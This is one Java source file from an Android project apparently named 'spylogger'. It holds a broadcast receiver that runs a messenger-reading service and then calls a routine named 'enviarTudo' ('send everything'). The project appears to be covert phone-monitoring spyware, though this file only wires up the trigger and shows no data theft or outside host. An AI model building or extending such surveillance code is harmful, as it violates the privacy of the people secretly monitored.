package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.gravatasufoca.spylogger.helpers.MensageiroAsyncHelper;
import com.gravatasufoca.spylogger.helpers.MensageiroFactory;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.services.Mensageiro;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.utils.Utils;

/**
 * Created by bruno on 08/04/17.
 */

public class MensagemMensageiroReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(final Context context, Intent intent) {
        if (context != null) {
            Log.d("spylogger","mensagem recebida");
            Mensageiro mensageiro = new MensageiroFactory(context).build(intent.getStringExtra("classe"));
            if (mensageiro != null) {
                Log.d("spylogger","mensagem recebida executada");
                new MensageiroAsyncHelper(context, new TaskComplete() {
                    @Override
                    public void onFinish(Object object) {
                        Utils.enviarTudo(context);
                    }
                }).execute(new MessengerService(context));
            }
        }
    }
}
